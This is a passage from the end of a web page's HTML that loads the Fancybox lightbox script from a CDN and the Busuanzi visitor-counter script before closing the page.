src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
